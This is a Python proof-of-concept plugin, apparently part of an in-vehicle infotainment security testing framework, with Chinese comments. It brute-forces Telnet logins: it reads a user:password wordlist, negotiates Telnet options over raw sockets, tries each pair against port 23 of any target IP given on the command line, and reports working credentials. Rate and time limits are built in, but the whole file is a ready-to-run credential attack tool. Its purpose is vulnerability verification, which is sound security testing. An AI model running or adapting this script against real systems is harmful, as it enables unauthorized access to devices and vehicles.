"""
PoC Name: Telnet Weak Credentials
Identifier: CWE-521
Component: Network Stack
Category: Network
Severity: Critical
CVSS: 9.8
Description: 检测IVI系统Telnet服务弱口令。由于Python 3.13已移除telnetlib,本模块采用原生socket实现基础协议交互。
Prerequisites: 目标Telnet端口(23)开放。
Usage: python3 07_Telnet_Weak_Creds.py <target_ip>
"""
import socket
import sys
import time
import os
from iv_plugin_base import IVIVulnerabilityPlugin


def _resolve_credentials_path():
    candidates = []
    configured_dir = os.environ.get("AUTOSEC_POC_WORDLIST_DIR")
    if configured_dir:
        candidates.append(os.path.join(configured_dir, "credentials.txt"))
    candidates.extend([
        os.path.join(os.path.dirname(__file__), '..', 'wordlists', 'credentials.txt'),
        os.path.join(os.getcwd(), 'pocs', 'wordlists', 'credentials.txt'),
        os.path.join(os.getcwd(), 'wordlists', 'credentials.txt'),
    ])
    for candidate in candidates:
        if candidate and os.path.exists(candidate):
            return candidate
    return candidates[0] if candidates else "credentials.txt"


class TelnetWeakCredsPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-NET-007"
    meta_poc_name = "Telnet Weak Creds"
    meta_cve_id = "CWE-521"
    meta_severity = "Critical"
    meta_protocol = "tcp"
    meta_target_os = ["all"]
    meta_required_params = ["target_ip"]
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        if not self.target_ip:
            raise RuntimeError("需要指定目标IP地址。")
        return True

    def _telnet_read_until(self, s, expected_list, timeout=5):
        """读取直到匹配到预期的提示符，并简单处理 IAC 协商"""
        buf = b""
        start_time = time.time()
        while time.time() - start_time < timeout:
            try:
                chunk = s.recv(1024)
                if not chunk:
                    break
                
                # 处理 IAC (Interpret As Command) 协商
                # 简单逻辑: 遇到 IAC (0xff) + DO/DONT/WILL/WONT (0xfb-0xfe) + OPTION
                i = 0
                while i < len(chunk):
                    if chunk[i] == 0xff: # IAC
                        if i + 2 < len(chunk):
                            cmd = chunk[i+1]
                            opt = chunk[i+2]
                            # 自动回复: 对方请求 DO (0xfd) -> 我们回复 WONT (0xfc); 对方 WILL (0xfb) -> 我们回复 DONT (0xfe)
                            if cmd == 0xfd: # DO -> WONT
                                s.sendall(bytes([0xff, 0xfc, opt]))
                            elif cmd == 0xfb: # WILL -> DONT
                                s.sendall(bytes([0xff, 0xfe, opt]))
                            i += 3
                        else:
                            i += 1
                    else:
                        buf += bytes([chunk[i]])
                        i += 1
                
                decoded_buf = buf.decode('ascii', 'ignore').lower()
                if any(p in decoded_buf for p in expected_list):
                    return buf.decode('ascii', 'ignore')
            except socket.timeout:
                break
        return buf.decode('ascii', 'ignore')

    def exploit(self):
        port = 23
        self.logger.info(f"探测Telnet弱口令 {self.target_ip}:{port}...")
        
        # 1. 检查端口可达性
        try:
            test_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            test_s.settimeout(3)
            if test_s.connect_ex((self.target_ip, port)) != 0:
                self.logger.info("Telnet端口23未开放")
                self.results["vulnerable"] = False
                return self.results
            test_s.close()
        except:
            self.results["vulnerable"] = False
            return self.results

        # 2. 加载字典
        wordlist_path = _resolve_credentials_path()
        if not os.path.exists(wordlist_path):
            self.logger.error("未找到字典文件 credentials.txt")
            return self.results

        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            credentials = [line.strip().split(':', 1) for line in f if ':' in line]

        # 3. 开始爆破
        self.logger.info(f"加载了 {len(credentials)} 组凭据，开始测试...")
        
        start_scan_time = time.time()
        consecutive_errors = 0
        for user, passwd in credentials:
            # 检查时长是否超过2分钟
            if time.time() - start_scan_time > 120:
                self.logger.warning("Telnet字典测试超时 (2分钟限制), 自动终止。")
                break

            s = None
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((self.target_ip, port))
                
                # 等待用户名提示符
                resp = self._telnet_read_until(s, ["login:", "username:", "user:"])
                if not any(p in resp.lower() for p in ["login:", "username:", "user:"]):
                    consecutive_errors += 1
                    s.close()
                    if consecutive_errors >= 3:
                        self.logger.error("连续 3 次未见登录提示符，可能服务已锁定或防护触发，中断。")
                        break
                    continue
                
                # 发送用户名 (使用 \r\n)
                s.sendall(user.encode('ascii') + b"\r\n")
                
                # 等待密码提示符
                resp = self._telnet_read_until(s, ["password:", "pass:"])
                if not any(p in resp.lower() for p in ["password:", "pass:"]):
                    consecutive_errors += 1
                    s.close()
                    continue
                
                # 发送密码 (使用 \r\n)
                s.sendall(passwd.encode('ascii') + b"\r\n")
                
                # 检查是否登录成功
                resp = self._telnet_read_until(s, ["#", "$", ">", "welcome", "login incorrect"], timeout=3)
                
                if any(m in resp.lower() for m in ["#", "$", ">", "welcome"]) and "incorrect" not in resp.lower():
                    self.logger.warning(f"[+] 发现Telnet弱口令: {user} / {passwd}")
                    self.results["vulnerable"] = True
                    self.results["evidence"] = f"Telnet login successful with {user}:{passwd}"
                    s.close()
                    return self.results
                
                # 重置错误计数（因为我们成功进行了交互）
                consecutive_errors = 0
                s.close()
                if len(credentials) > 20: 
                    time.sleep(0.1)
                
            except (ConnectionRefusedError, socket.gaierror):
                self.logger.error("Telnet连接被拒绝，中断扫描。")
                if s: s.close()
                break
            except Exception as e:
                consecutive_errors += 1
                self.logger.debug(f"测试 {user}:{passwd} 异常 ({consecutive_errors}/3): {e}")
                if s: s.close()
                if consecutive_errors >= 3:
                    self.logger.error("连续多次操作异常，中断测试。")
                    break
                continue

        self.logger.info("测试结束，未发现弱口令。")
        self.results["vulnerable"] = False
        return self.results

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 07_Telnet_Weak_Creds.py <target_ip>")
        sys.exit(1)
    plugin = TelnetWeakCredsPlugin({"target_ip": sys.argv[1]})
    plugin.run_verify()
